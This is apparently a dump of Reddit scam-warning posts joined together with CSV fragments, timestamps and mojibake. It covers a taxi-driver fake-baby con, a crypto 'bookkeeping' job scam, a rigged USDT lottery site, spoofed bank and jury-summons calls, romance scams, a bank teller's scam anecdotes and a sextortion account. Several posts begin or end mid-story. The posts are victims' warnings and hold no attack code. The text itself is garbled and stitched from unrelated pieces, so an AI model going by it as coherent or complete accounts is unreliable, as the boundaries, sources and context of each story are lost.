‚ÄúMy wife and I have been trying to have a kid for over a decade now! She‚Äôs had a miscarriage before...‚Äù, it‚Äôs shocking how incredibly convincing he was. Tears, shaking from the crying and the sound of genuine excitement in his voice. I know that if I hadn‚Äôt encountered this before, I would have been absolutely in awe and would have felt like I was lucky to get to share this news with this clearly incredibly happy man.
Idk if any of you have ever been high, but it just felt like I was in that loopy state of perpetual ‚Äúwhat the actual fuck‚Äù, like I had lost my mind but I knew I hadn‚Äôt and that this was, very much real. Due to the traffic, we aren‚Äôt moving much, I‚Äôm questioning if I should leg it.

The taxi driver turns around in his seat and stares at me, probably due to my lack of reaction. ‚ÄúThank you for blessing me with your luck‚Äù he presses, and turns back. He receives the second call. Same story, emergency c section, incubator. He hangs up and tells me he‚Äôs stressed, being a father is financial responsibility. It‚Äôs been a few minutes, we make eye contact from the rear view mirror. He‚Äôs asking me if I‚Äôm okay. I tell him its not the first time this happens. He looks at me again and asks me what I mean, what is it that isn‚Äôt happening for the first time. I tell him I was in a cab and the driver had received similar news.

Mind you, due to how credible their acting was, it still had not occurred to me that this was, in fact, a con. My brain just went into shut down, trying to come up with any other explanation, because, how could they fake such authentic emotions? No one would do that. 

No, missedemeanor, you idiot, of course this is a scam. How could he relay the exact same thing. 

As soon as I let him know how similar his story was, he pulls over to the side; as has to get to the hospital, he‚Äôs sorry, could I be polite enough to get off? He tells me the price, looks at me again. Never mind, he doesn‚Äôt want me to pay, oh but only if you can pay some of it that would be great. 


I got off and I only realized as soon as he drove off that this was, indeed, a scam. Duh. I call my mom and tell her, she says I should have told her the first time I encountered it, she had 5 drivers over the years try to con her this way. I text my bf, he‚Äôs really amused but also clearly sad about how incredibly mean it is. 

I get into another cab and my first instinct is to ask him if his wife is pregnant, and obviously this dude looks at me like I‚Äôm batshit insane, and proceeds to ask me if I‚Äôm okay. I tell him about this and he can‚Äôt stop laughing, saying that‚Äôs the most evilest thing he has ever heard but also that I should have known that nobody would ever bother taking someone on a ride if their wife was about to give birth.

So there you go, idk if this is the place for it, but I kind of had to get this off my chest, I guess

So stay safe and beware of dodgy taxi drivers, especially if the first thing they tell you is that you‚Äôre some kind of stork for bringing them a baby. And if they really are about to become a father, just congratulate them, don‚Äôt offer an extra parting gift. 

TL;DR: I generously fall for an emotional con involving the beauty of fatherhood and false babies.",Malware,6525,1278,187,0
1683386542.0,BEWARE OF THIS REDDITOR,"Hello, I experienced a scam yesterday from a Redditor and I'd like to make everyone aware of it. 

I made a post asking for tips in how to deal with my eviction, and I ended up getting a DM from Logical_Peak_9305. They said they wanted to help me. According to them, I would handle bookkeeping and ""funds disbursement"" and would be paid for my work. I told them that I had no experience with that, but I was willing to learn and he seemed ok with that. He told me that he would give me a task to test how tech savvy I was, and that task ended up being Bitcoin flipping. Poor communication led to me first putting $10 which was too little, so he said to put $50, and then another $50 to ""cover fees"" with the escrow agent. By then it started going downhill, I was starting to get scared and I sent the second $50 to an expired Bitcoin address and he started freaking out. After that we switched to Discord. He told me I had to pay to retract the $50. At that point I was crying and just wanted my money back, and I told him so, and he reassured me he would source my refund. I gave another $90 to buy malware and pay for an override fee. After that, he said the agent needed my bank account's username and password, and that was when I realized I was scammed. He tried to get me to pay for more malware to get my refund back but I told him I didnt have much money left. We argued for a bit and then I blocked him. 

This man/person/wtv was methodical. He played sympathy for my vulnerable situation and acted like he truly cared about the worries I had. He reassured me everything would work out and that we would ""look back and laugh"" about it. PLEASE do not fall for this like I did.

1686496467.0,"Met a girl online, she taught me about this international lottery website. Was making money until...","So this is gonna be a doozyy. Hey so I met this girl who messaged me on Facebook last month, we really hit it off and she told me she has this super hiperfixation on Maths, and apparently, she is earning a lot of money from this website

I was skeptical, but in the end I played it with her, her explanation is that she has a system on predicting the highest possible outcome on the ball roll. And we did win some money (600 usd+)

The website uses USDT as its currency, and I can deposit and withdraw USDT from the website. I find the first 3 deposit and withdraws to be successful. But one time, she convinced me to up my deposit to 5000USDT, which I did. 

So the website allow you to bet on Small or Big number basically. But apparently you cant bet both Small and Big, cause then you will have no risk ( this will be relevant soon)

I SWEAR I followed what she asked me to bet on like usual, then suddenly... my money is reduced to 0 and it is frozen, her money too (from what I see from her ScreenShot). Then we ask the Customer Service to explain what happened, and they found out that apprently my account has bet on Big and Small on one betting cycle (which is forbidden as I mentioned above). So the CS explanation to why both our money account is frozen is that they found out that we bet the same thing at the same time, but they just found out cause I made the mistake on betting Big and Small at the same time( which I swear did not do)

So she apparently have 40k USDT in her account, and she freaked out and she called me like 2am in the morning to blame me for everything

The reason why I thought this is a Scam is that because :
- I am almost 100% certain that I didnt make a mistake during the betting
-And the money is frozen so conviniently after I deposit large sum of money
-after the money is frozen, the CS said that the money can be unfrozen, but we need to deposit 100% of the amount of the money that is frozen (another very scammy like sentence)
- and the timing is just too convinient to not be a Scam

The reason why I think this is not a Scam
- i bonded personally with the girl. We are from the same country. We called each other, we share things about ourselves. We talked jokingly about having a family together, and how I would take her to dinner. This is just too real
- she cried and called  me when they said her money is frozen. It was so real, a real tearjerking cry, it cant be fake. What if I am an idiot that actually made the betting mistake?
- she still chats with me trying to unfrozen her money asking for my help. I think most scammer would have been satisfied with the $5000, if she is a scammer, wouldnt she just ghosts me then?

F*ck I am in such dilemma. Am I the an actual idiot who cant bet properly or this is just the most elaborate scam scheme ever? I checked the website as well it said that it was created 3 months ago, while she said that she has been playing the lottery for 2 years(can anybody actually help me check if the website is actually longer than it is though?
Now I dont know, i can just be content on losing $5000? I thought I made a real connection

He says he has a ticket as proof of anyone needs to see, also its for his son who is an army vet,"" please, it's not for me, it's for my son!""

I looked over to my husband, because the whole thing was bizarre to begin with, and you could hear the man constantly pleading and saying in a stage whisper ""God, this is so embarrassing!""

My husband just whispers ""scam"" to me. I say nothing since the guy was pretty close to us. It was so awkward, the man just standing in line, I was afraid he was going to go person to person since he would not leave, and I was already mentally preparing how to say I don't have any cash. I thought it was weird he didn't give up when no one responded at first. He just stood there, repeatedly saying ""Please, it's for my son! I have a ticket as proof if you want to see it!"" As he brandished the ticket in the air. 

Then one woman gave him money. Then another person. Then another. He kept saying, ""I just need $100 more. I just need $80 more!""

Finally, someone on airport staff yells, ""Sir, get out of line, you are not allowed there. You cannot scam people again.""

Some people in line audibly gasped. One woman yelled, ""He already received money!"" He was on the other side of the line at that point so I didn't see him leave, I can only imagine he raced away the second he was called out.

Then my husband said to me, ""if he was only a few pounds over the limit, why couldn't he have just put the extra weight into a seperate bag and use that as a carry on?"" Which was true, the same thing had happened to us in the past and the ticket agents help you sometimes to lower the weight or redistribute the weight into different bags. The man's story was kind of vague to begin with, and fell apart easily under scrutiny. But I can understand how people would want to help him while under stress themselves waiting in line, possibly worrying about making their flight on time, so close to the holidays, and with the man begging mere feet or even inches from you.

Just wanted to put the word out in case anyone found themselves in this situation or think their family members might be susceptible to such a scam this holiday season. It was a very early morning flight and staff was pretty scarce and I'm sure everyone in line was sleep deprived - I myself only had an hour of sleep the night before since we had to leave so early to make it on time.

1630807488.0,PSA- phone numbers and personal information in posts,"Hello readers of r/scams,

Lately, there has been an uptick in posts that contain personal information. This could be full names, addresses, but the most common information we are seeing is phone numbers. Phone numbers are either being written out in posts, poorly redacted, or not redacted at all. Phone numbers need to be redacted or omitted from posts, otherwise they will be removed.

*But the phone number belongs to a scammer! Why do I need to remove it?*

> Phone numbers are personal information, and posting confidential/personal information is against Reddit's content policy. This can include screenshots of Facebook profiles with the full names still visible, photos of individuals, and phone numbers. Aside from Reddit's content policy, it is incredibly important to note that phone numbers *can* be spoofed, and Facebook profiles can be compromised. What you think is a phone number or Facebook profile for a scammer may belong to an innocent person. 

*So, what if I see something that breaks the rules?*

> It's really important to note how large this sub has gotten. I've been here at the sub for over four years, and it has grown immensely over that time. At the time of writing this post, there are over 280,000 users subscribed to us, and we can easily have over 1,000 browsing the sub at a time.

I didnt think much of it since because I thought it was an actual friend. I didnt think much of it because she didnt tell me much details.

Last month, she tells me this friend will pay me back when hes done working on his project. Fast forward to this week, I am finding out this friend is in Europe and he cant get his money (15,000,000 Euros) transferred to the USA because some sort of fees. Now he is needing $68,000 to pay for those fees. My mom wants to help him with this. She has asked me to pull out a huge loan in her efforts to help the friend. This friend is supposedly going to pay me all back and plus more. She has also told me that this friend has given her money, so its suspicious. 

She supposedly met this friend last year in Vegas. She sent me pictures of him which are either fake or using someone else's pictures. Also a poorly edited ID of a large Italian company (ENI Energy company) I reverse image searched these pictures. My mom will not listen to me. I am lost on what to do. Should I involve my other family? Any advice or help is appreciated everyone.

Update:
Thank you everyone for the advice. I cant answer all the questions but can make a update. I have seen the Tindler Swindler on Netflix. I just never thought that I would ever be in the situation myself. I just needed more opinions on what to do from this point forward.

I will not give my mom anymore money. I am not going to take any legal action against my mom, she is still my mom. I just need this madness to stop.

I will be contacting family members. I have no siblings but do have a lot of extended family. Its just a case of deciding who to talk to. Theres been a lot of family drama in the past so this mom doesnt talk to some of her siblings. Its a sensitive situation. 

I am not sure how she is involved with this friend. She only refers to him as a friend.

My mom is in her 50s. She isnt elderly enough for me to control certain aspects of her life. 

I understand that I should have seen this scam coming but didnt have details of this friend until yesterday. She initially borrowed the $1000 months ago. She has borrowed money a couple of times in the past and has paid it back. So I didnt question it.

I try to cut a long story short.

Two years ago, me and a friend of mine have been approached when we were out partying. The guy said he is a professional photographer and we look like models. We were naive and flattered. We exchanged numbers and texted with him over the next few days.

He offered to take pictures of us for our setcard, so we could start a career. It was all discussed and sounded good. 2 hours in his studio, about 10 photos of each and together. In casual clothing and maybe underwear if we feel ok.

But when we arrived the next day, there were two guys, a photographer and the agent. We had a few drinks to ""calm down"" and they told us that we could have great gigs in no time, that they know big producers and things like that. They were good in making this sound real and we were to naive to see through their lies.

The only precondition was, that we proof to ""really want this"". We fell for it.

So, the shooting quickly went from casual via underwear to nude. All in mini steps and we were to invested to stop it. They made us touch each other and then touch them too.

Of course this has not been the start of a thriving model career. We just fell for a scam. We really regretted what we did but just wanted to forget it.

Now, last week, I was contacted via Instagram. The person showed me some pictures from back then and threatened to send them to friends and classmates. He wanted me to send nudes.

I was actually already about to send it, but then had a moment of clearity and stalled. He set a deadline until this Wednesday.

So, I received what I believed to be an automated text message from my bank. It had the 5 digit phone number like all the other automated messages I receive, and it was asking if I used my debit card, with the correct last 4 digits of my card listed in the message, to authorize some transactions they listed, and it said if I recognize this activity to send YES and if I didn‚Äôt to send NO, but written in the authentic format that my bank usually sends these messages in. I typed NO, of course, and it immediately responded that the support department would contact me shortly. I then received a phone call from the exact same phone number as my bank (which I now realize was spoofed, of course). They asked for my name, phone number, had me confirm that I did not authorize those transactions, etc. They then told me they were going to go ahead and cancel my card and send me a new one, the whole regular gist of it. Then they said that the problem was that one of the transactions was a Zelle payment that had gone through, and that it was difficult for the bank to cancel Zelle because it‚Äôs an immediate payment, but that they can provide me with a credit in the meantime, and I just had to send in a support ticket through a transfer for the amount I needed to be credited. They said I was going to be texted a ticket code, and to input that code and my name into the money transfer part of my banks mobile app. I was taken aback, and said this all seemed rather unorthodox, and asked if they could verify their identity first as actually being my bank. They said they completely understand my hesitation, and that they would provide any information I needed. They then proceeded to give me the security code of my debit card, my email, and the last 4 digits of my account number. How they got all this information, I don‚Äôt have a clue. After a little more hesitation, they asked if I would like to speak to their supervisor, and proceeded to put me on a brief hold. During the hold, music played in the background with the same narration as my bank usually has of some guy talking about random bank benefits. After that and a bit of pressure from the ‚Äúsupervisor,‚Äù I stupidly sent the payment that I didn‚Äôt even realize was a payment I was sending. As soon as I sent it, I realized what this was. They tried getting me to send another payment, but I hung up and called my actual bank, and explained everything. Long story short, I‚Äôm unlikely to get my money back. I‚Äôm so incredibly disappointed in myself. I feel like a complete moron.

Unfortunately I only found out about this after they had already given over a lot of money, or I would have tried to stop them from going for it. I don't have all the details, but it was some kind of investment scam, where my father was contacted by a stock broker and told that a couple decades ago a stockbroker had bought shares in his name that he was unaware of, and they were now worth a lot, but he had to buy more shares before he could sell. There were several developments which all seemed to require more money. Eventually the money was ready to be sent from Hong Kong but the government was blocking it etc. At one point he was able to speak with another shareholder who had already received their money (but I suppose this was faked as well). Eventually the money was supposedly sent, but never arrived, and they took the proof of transfer to a bank, who said it seemed to be forged. Also, everyone he was in contact with about this is now impossible to contact.

Received a call yesterday from ‚ÄòSargent Woods‚Äô from the sheriff‚Äôs office who informed me I had been absent from a federal jury summons. 

While on the call I googled his name and the name of the judge he gave me, both returned legitimate hits. He also asked me to verify my phone number and address which he provided first (in hindsight this is relatively public info). 

Goes on about consequences and that I have two options to either go into the station and get processed or go ahead and pay bond and get an expedited hearing scheduled. 

Sadly I fell for it and paid $2,000 by Zelle and another $500. The Zelle payment was placed on hold by my bank (thank you) and so he asked me to use a different payment for the $500, which I unfortunately did. I used Apple Cash and that went through. 

When he asked me to call my bank and ask them to release the Zelle payment I agreed, he also told me that the case was under a gag order and not to tell the bank what the payment was for. At this point I started to see the many red flags through my fear and ultimately canceled the Zelle payment.

1669600764.0,We suspect my mother (62f) is a victim of a ten-year long romance scam with a man (37m) she met online from Egypt. He is now here in Canada illegally and we are worried for her safety,"TLDR,

My mother lives in Canada and met and married a man from Egypt 10 years ago who is nearly half her age. He‚Äôs been living a separate life from my mother in Egypt and has another wife and two kids. Although he has made no solid attempt to have a life with her here in Canada, my mother has been groomed and manipulated into financially supporting him and his family. He became the sole beneficiary in her will last year. Recently, he has made his way to Canada through illegal channels and is now seeking asylum as a refugee, despite access to options for  sponsorship/immigration that are available for spouses. We believe he is now here in Canada to collect his inheritance and we worry about my mother‚Äôs safety and financial wellbeing.

\--------------

I (37m) believe that my mother (62f) is being taken advantage of financially and emotionally manipulated by her husband Ahmed (37M). She met him online 10 years ago and has been married to him for 8 years. When they initially met and she went to Egypt to visit him for the first time, my family and I tried very hard to convince her not to go. We expressed concerns about her safety on the trip and how suspicious the relationship was with such a large age gap and the nature of their meeting (he reached out to her). She went anyway and continued to have a relationship with this man.

Two years later, she converted to Islam (which my family and I support). This was out of character for her and we attribute it to his manipulation and influence. Since then, she has become more and more extreme in her beliefs. We have since come to understand that he has weaponized his religion to manipulate her.

Two years into the relationship she returned from a trip to Egypt and announced that she had married him. This took us all by surprise as she didn't tell anyone of her plans. We once again expressed reservations and tried to discuss it with her but she refused to engage. 

Time went by with a few other red flags popping up here and there but for the most part, things were quiet. About a year ago, my mother‚Äôs close friend came to us with startling details about the marriage. She let us know that my mother has been financially supporting him for years and has purchased him a house and two cars (one of which he crashed) in Egypt. We also found out that he has another wife and two young children (1f and 2m) in Egypt. My mother found out about his other wife and child after the fact but has since been manipulated into accepting and supporting it. She has been providing monthly financial assistance to that family. My mother is not a wealthy person and likely has an annual income of $50,000. Cost of living is very high where we live and I know she isn't doing well in that regard. She is close to the age of retirement and it‚Äôs recently come to light that she has been withdrawing significant amounts of money from her RRSP (401K equivalent) to financially support Ahmed and his family. We worry that he has depleted her life‚Äôs savings.

After these revelations, we confronted my mother about it. She completely shut down and would only respond to our concerns and questions with stuff like ‚ÄúI‚Äôm your mother and I know what I'm doing‚Äù or ‚Äúhe's my husband and I love him‚Äù etc. I requested that she come to family counseling with us to talk about the situation but she refused and later we found out this was because he strongly objected to the idea. During interactions with her after things calmed down, she would not address the issue and she would just act like things were normal. We went along with it for the sake of having a continued relationship with her and not driving her further to him by isolating her. 

He has not been able to immigrate to Canada in the past and we‚Äôre not sure if this was because he couldn't or didn't want to. Last month, I got a phone call from my mother saying that she had been arrested at the border trying to get him across illegally. We lost it. We expressed how dangerous that was and how it put her freedom in jeopardy and told her how hurt we were that she chose to hide such a big decision from us. The arrest was very traumatic for her and caused significant stress. We sought legal advice regarding the situation and she was strongly advised to cease contact with Ahmed until she found out if she was charged or if there was an ongoing investigation. 

A few days after she got released and was back at home she called me in the middle of the night with chest pains. She had a stress induced heart attack at two in the morning. My family and I cared for her in the following weeks until she was well enough to take care of herself. We later found out that during her hospital visit she was still in contact with Ahmed against the lawyer's advice. Thankfully, she got a call from the border agency last week saying that there were no charges or fines being levied against her. Her recklessness with the severity of the situation was very frustrating. 

Last week my mother‚Äôs friend reached out to us again out of concern. It turns out that Ahmed made it across the Canadian border illegally and has supposedly started a claim for asylum (we don't know for sure if his application has been submitted yet). He has been living at my mother‚Äôs house for the last two weeks. This was before she knew about the status of the charges at the border. 

My sister went there to confront him a few days ago. The responses that she got from him were a bunch of half truths and refusal to answer questions. For example; when she asked about what he planned to do with his wife and two small children in Egypt he just sat there and smugly smiled at her, refusing to answer the question. 

Last year my mother drafted a will that made me executor of her estate and gave the majority of her positions to my brother and I. My sister was left out of the will because of something to do with Islam. We have since come to know that at this moment Ahmed is now the sole benefactor and that there was a stipulation that he needs to be in the country for it to be in effect (which we believe to be the major motivation for his border crossing). We couldn't care less about getting the money and have suggested that she donate it to charity instead of giving it to us or Ahmed. 

At this point we are considering our options for how to deal with the situation. There is concern that if we have him deported it will just push her further to him. Distance has not been a barrier to her financial abuse in the past. I'm writing this post to see if anyone reading this has had a similar experience and can offer suggestions on how to protect my mother.",Malware,6642,1230,86,0

1695758127.0,I paid for this lesson so you don't have to. Never buy from eBay ever,"eBay is a buyer's paradise. Money Back Guaranteed right? Wrong!   


I bought a laptop from what seemed to be a reputable seller - 99% positive reviews, long history of selling on eBay. Nothing stood out as suspicious at all. Laptop arrives - except it's a box of concrete. I call eBay to tell them that I have received a lovely box of concrete but it wasn't what I ordered. eBay tells me they'll get my money back. One hour after my call with eBay, my account gets suspended for the following: 

""- Requesting partial refunds without returning the items.   
 \- Filing excessive returns claiming the item is not as described when the seller described it accurately.""  


[Brand new laptop - mint condition](https://preview.redd.it/yv9qd2vrjnqb1.jpg?width=2160&format=pjpg&auto=webp&s=0233676b551a5db7dd7eb52f987b6409ba94f966)

You look at the picture and you tell me - does it look like the seller described it accurately? (hint: it's supposed to be a laptop). And besides, am I really supposed to return this to the seller?

So after I received this email, of course I ring eBay again, asking about why my account got suspended, and whether or not I will be getting my money back. eBay customer service kindly tells me that the seller has three business days to decide whether they are gracious enough to refund me for the concrete, otherwise I will have to seek ""other ways"" to get the money back! And they won't unsuspend my account and they can't talk about why it's suspended!! 

Money Back Guaranteed policy is great, except when eBay decides to suspend your account, then I guess the policy doesn't apply to you anymore. 

I have never returned an item on eBay before, and although I rarely ever shop on eBay, the reviews I do have from sellers are positive only.

The seller does genuinely look reputable, they're a business with many great reviews from buyers, each of whom have good reputation. I had no suspicion at all that this could happen given that I was dealing with such a reputable seller with a long history on eBay. The conventional wisdom of ""don't buy from new accounts"" and ""look at the reviews"" just doesn't work anymore, because everything \*looked\* legit. 

TL;DR: I had a 0/10 eBay shopping experience, most money I've ever spent on concrete, and the concrete isn't even that good to be honest (it was supposed to be a laptop). There are people out there with a fantastic reputation on the platform who can do this to you, and eBay won't necessarily take your side.

1666806960.0,My experience identifying various scams as a teller,"I've been the equivalent of a universal banker at credit unions for a few years, and I thought I'd share some of the scams I've encountered, how I spotted them, how they work, and at least with the last story, have a bit of a laugh. 

**Overpayment Scam**

Member comes to the drive-thru when we're pretty busy. She wants to deposit a check for between $3-4k. Her balance is roughly $200 or so, and I checked her recent transactions to see if a deposit like this was usual for her. It wasn't, as she hadn't had a deposit of more than $500 in the last 3 months. I look at the check and I don't recognize the bank its supposedly drawn from, nor do I recognize the maker. Its some generic ""advertising company."" 

At this point I'm following usual risk-mitigation procedure in depositing the check with an extended hold on it, but I didn't immediately think it was a scam. I return to the drive-thru and tell her ""Alright, I made the deposit for you, but its on an extended hold because of the amount. The funds should be available within 5 business days."" 

""Oh no, that's payroll, they told me to tell you its payroll."" Alright, red flag #1. Payroll checks have different regulations, and unless your real-life employer has bounced your checks in the past, we can't place holds on them. But of course what is 'payroll' is subject to verification. Usually its enough to see that they've deposited checks in similar-amounts from the same maker on a regular basis, which can be verified by their account history. If we're really cautious, especially if they just opened their account, we may even go so far to call that employer to verify. 

""Is this your employer?""

""Yes""

""It doesn't look like you've received a check from them before, is this a new employer?""

""Well they're going to wrap my car for advertising and I need to wire $1500 of it by tomorrow so they can do the wrap. So there can't be a hold on the check or I'll lose the gig!"" And there it is, red flag #2 and confirmation. I explained the scam to the member and after a bit of conversation she was appreciative and asked us to reverse the deposit and shred the check. 

[More info on car-wrap scams.](https://consumer.ftc.gov/consumer-alerts/2016/08/how-spot-car-wrap-scam) Same goes for any type of ""Here's more than we agreed, you need to pay a portion of it back for whatever reason.""

**Grandson Needs Bail**

Another time I had an older member come to the teller line very frazzled. ""I, um, I need to do a wire, can I do a wire? How do I do that, I've never done that before?"" She had real fear in her voice.

I pulled a wire request form for her, but before I handed it to her I asked what the purpose of the wire would be. 

""What does it matter? I just need to send the money as soon as possible. How soon will it get there?""

""I understand, but its important for us to gather a bit more information for all wires we do. Would you mind telling me a bit more about the purpose?""

While still sounding scared and frazzled, she also became embarrassed and told me [her grandson called and needed money for bail](https://consumer.ftc.gov/features/pass-it-on/imposter-scams/grandkid-scams). She told me how good of a kid he was, and how he made it clear that he needed the money immediately. She showed me a note that she hastily-wrote with the wire instructions her 'grandson' gave her over the phone.

I asked if she was sure this was her grandson, and she became very offended (learned to use more tact after this one). I tried sympathizing with her, and the (theoretical) urgency of the situation, but I asked her to take a moment to think. Did he call from his usual number? No, he was at the police station. Did he say what police station? Yes, several states over. Did it show up on the caller-ID? She doesn't remember. I asked when was the last time she spoke to her grandson or his parents, and she said its been about a week or two. She hadn't tried contacting any of them since the call. 

I told her I had some concerns that is a scam, and told her that its very common for scammers to call older people pretending to be grand-children needing money urgently. She assured me she knew her grandson's voice when she heard it, but I could tell she started to question the situation. 

She went back and forth trying to rush me to complete the paperwork, and asking me questions, clearly doubting the situation. 

I suggested she call the police department directly to ask about her grandson. I even wrote down their number I got from Google. I told her to try calling her grandson directly at his cell-number she has, or to call his other family. I assured her that wires wouldn't go out for another 2 hours anyway, so she had plenty of time to research this further. 

She still seemed frazzled and not totally convinced this was a scam, but she said she would go do those things and come back later. I didn't see her again, so I hope she realized it was a scam.

**New Account Deposit**

This one's different because the victim would be the credit union. Woman came in to open a new account and presented a business check for close to $3k for deposit. As a safeguard we place all (non-payroll) checks deposited into a new account on an automatic 14-day hold. I didn't explain that until her account had been opened and she became very flustered. She told me that she needed to get the money now, something about her sister having a medical emergency, but the story changed a few times. I told her she could deposit the check at a financial-institution she already has a relationship with, or she may go to the issuing bank to cash the check, but that our policy was to place it on an extended hold. 

She argued, so I offered to attempt to verify the funds with the issuing bank and ask my manager for an exception (only remotely possible if I could verify the funds.)

Of course the (supposed) issuing bank is small with only 2 branches, roughly 3-hours away. I call their customer service and they don't verify funds. Most places don't because its a security risk. If someone has an account number they could just pretend to have a check in hand, ask ""is the account good for it?"" and subsequently get information about the balance on an account they're not on. 

She *very* reluctantly let me deposit the check with the hold, then came back an hour later asking to reverse the transaction. Said she found a branch of the issuing-bank 30-minutes away (no she didn't) and would go there. I learned why we had that extended-hold policy, and I expect her account sat unused at the $5 minimum forever. But at least she didn't get $3k from us using a fake check and let the account default. 

**Social Security Number Has Been Compromised**

A middle-aged man came up to my teller window and handed me a large taped-up Fed-Ex box and said ""I need to deposit this.""

That's weird af, and also potentially dangerous, so I immediately asked him why, what it was, and told him to open it himself. He refused and just said ""It's $40k, I just need to deposit it.""

I called my manager over to supervise and he agreed to open the box together. Inside were 4 bricks of aluminum foil, which of course is even weirder. I asked the member what was up with that, and he said ""Yeah they told me I had to do that to ship it.""

In each brick was indeed $10k of strapped 100's. While my manager and I dual-controlled the count (the member was adamant that there has to be $40k exactly, and I kept telling him we can only deposit what's physically here) I asked him what the story was.

He got a call from 'the IRS' saying his social security number has been compromised, and that he needed to move all of his money into a 'secure wallet'. The callers told him that his account at the credit union wasn't safe, and asked him how much he had. $70k, he told them. They said he needed to ship the money to a PO box in Ohio so the 'FBI' could ensure its safety. They told him this needed to be done in cash, and he needed to wrap each bundle of bills in aluminum foil per 'IRS' policy. 

That's in fact done to attempt to by-pass shipping carrier scanners which try to find these types of things and reject the packages. You're not allowed to ship cash for a reason, after all. 

Fed-Ex was able to catch this box of $40k and give it back to our member, but they did not catch the other box which has $30k. He lost that money. 

We had a lengthy conversation about the scam, how it worked, and what to look out for in the future. I told him he can always call the credit union at any time if he's unsure about something, as we're trained to spot these things. 

I also had a lengthy conversation with the manager of one of our other branches who allowed him to withdraw the money the previous week in the first place, despite knowing it was a scam. He said he tried to convince the member, but clearly he didn't try hard enough. 

**Million-Dollar Bill**

I have a lot of sympathy for folks who get scammed, as a lot of these ruses are really sophisticated or otherwise obfuscated, leading to confusion. This one though, I just have to laugh. 

Member walked right up to my teller window and shoved her phone in my face with a picture [like this](https://i5.walmartimages.com/asr/4229c04f-64cc-42d1-a41b-0ee9f182bf53_1.b551e2367dc61a1671c42b0a701416da.jpeg?odnHeight=612&odnWidth=612&odnBg=FFFFFF), except the bill was in someone's hands. 

""Is this real?"" she asked me. I really tried hard not to laugh.

""No, that's not real. There's so such thing as million-dollar bill.""

She just kinda went ""Hrmph."" I asked why she was asking, and she told me someone in Africa needed to get rid of it and was only asking for $2500.

I said, yeah, no, that's a scam. Do not buy that. There's no such thing. She asked if I was sure, and I said yes.

Then she called someone on facetime or whatever and *held the phone up to me.* ""Can you just tell him that? What you told me.""

I swear to god I thought this woman was putting me on the phone with some Nigerian scammer. He even looked like he was in a bunker or something. Very flustered, I tried to tell her not to engage with it, its a scam, don't bother. She insisted, ""No, just tell him what you told me.""

""Uhhhm. Sir. Yeah, um. I was just telling our member here that there's no such thing as a million-dollar bill.""

He immediately grumbles and is agitated, asking how I know. Good lord. I plead with the woman to hang up, not to engage with the scammer, and to please not put me on video with some criminal. She said ""What? No that's my husband."" and told him ""See, I fucking told you it wasn't real,"" hung up on him and left.",Malware,10627,1932,338,0

He gave me a burner phone and a script to read and told me to leave a voice-mail like I meant it, not just monotone.

Basically it said something like ""Dave, you think you are in love with Rhonda, but she has been in a relationship for 20 years with a guy named Bill. She has a secret life, you are making a mistake. She meets him at the airport, he buys he gifts, etc."" I wish I recorded it or took a picture of the script. 

I left the voice-mail, he stepped away while I was doing it so he wasn't hovering over me and asked me if I was sure I delivered it well or if needed to do it again. I said i did and gave him back the phone, got $50 cash and left.

1683294649.0,Bank of America Scam,"I narrowly avoided falling for a very convincing scam. 

 I got a text message from Bank of America about fraudulent charges.  I logged onto the BoA website and there were 2 attempts at purchasing a Sam's Club membership.  As I was going through the screens on the BoA website, I got a robocall.  I answered and there was a recording saying ""this is BoA fraud department.  If we get disconnected, please call back at xxx-xxx-xxxx (I don't remember the number and I didn't write it down.)


A woman with a heavy indian accent comes on the line and says she has to verify my account and can she send me a code. (Red flag, but OK.)  A few seconds later, I get a text from BoA with a code and the warning that ""we will never call or text you asking for this code"" so I definitely wasn't giving out the code and I just hung up.  


This was really convincing because there ARE 2 fraudulent charges on my account and every text I received from BoA was real. I had previous texts from them about other transactions and logins. When I logged into my account, I used my bookmarked page and my password manager saved password popped up (which wouldn't have happened if it was a fake site without the right domain.) 


I don't know if the timing of the call was coincidental or not---I don't see how they could have known I was on the real BoA website looking into the fraudulent charges but since my phone rang as I was literally hitting ""submit"" on the fraud page, it made perfect sense to me that they would be calling asking for more details so they can investigate.  


Thank you to this subreddit!!  I knew immediately that I shouldn't give out the code so I saved myself a huge headache of being locked out of my credit card account.

There was a crying womens voice was in the background. This man warned that there was more than one of them and that they were going to put dick in her and handed the phone to another man to let me know there was multiple people. The other man instructed me to go to the nearest store. They told me I needed to purchase Visa gift cards to send to them. I was pretty sold on the whole act. I panicked in line at the Safeway and told an employee. The employee let me know that this was likely a scam and that my sisters phone was hacked or cloned. At this point the men on the phone told me that they were going to kill her and hung up on me. Thankfully I called my sister back and she answered the phone and a great wave of relief washed over me.

He said he tried. They told him he had to pay a transaction fee, which he paid. And now they tell him he needs to pay a tax on earned income. I told him that's part of the scam.

Our parents were friends and our families even went on a trip or two together.  Years after moving to different cities as kids, and now adults, we spoke on the phone occasionally.  My friend was working a car service job.  During one of our conversations, he randomly brought up that he and his coworkers were having a competition.  They were making false ID's, but only for the competition, or so he said.  He claimed that they were using real personal documents to make the fake ID's more realistic and asked me to send a copy of my birth certificate.  He claimed that he'd redact my personal identifying info.  I of course didn't believe him and didn't send him my BC.  We did speak once or twice afterwards before I cut ties, and never heard that he got into legal trouble, so I assume nobody else was foolish enough to help him steal their identity and falsify ID's and that he gave up on the scheme.",Malware,1208,221,28,0

I am a worried friend who has been scouring the internet trying to find information on person dating one of our close friends. She met him on Tinder and has been seeing him for a little over a month. I have tried everything to find information on this guy who claims his name is 'Ahaan' and his family is part of a diamond business (sound familiar?!?). She is extremely vulnerable right now and all the red flags I am about to outline are so in your face it's amazing she doesn't see them. I have tried reverse image searches on 4 sites with no luck. 

Red Flags include - 

1. ""I have a range rover, but don't like to drive it so I Uber. I don'r like to show off. "" Why say this?!? She drives everywhere
2. ""You can not come to my house. My family is very private, we have security everywhere"" So he only Ubers to her place...
3. They were supposed to go on a trip, twice, where he was going to pay and take her and he had to cancel due to 'work'
4. He only works nights and overseas...
5. She hasn't met anyone he knows
6. She found his passport lying around while he was showering and it had a different last name then what he gave her. When She confronted him he said he has to be careful because of his families wealth.

These are the big ones. Her husband has money and she is set to get a decent amount in the divorce. She will not listen to any of her friends and we are unable to prove it because we can't find anything out about this guy. Just photos...

Not going into to much information about my current situation but I had gotten an email from people posing as geek squad talking about how I needed to cancel a subscription and I thought it was legit cause they had the name and the amount of money that subscription cost, I should have looked more closely or called my dad but I wanted to handle it like an adult on my own, I thought it would be easy enough, so I call them up and so the standard talking on the phone with the guy even downloaded one of those apps that's let people control their mouse from where ever, I've had that happen with people working on my computer before, I should have listened to my bad feeling but I'm pretty much paranoid/anxious/on the autism spectrum so I just talk my bad feeling up to my brain just being like that.

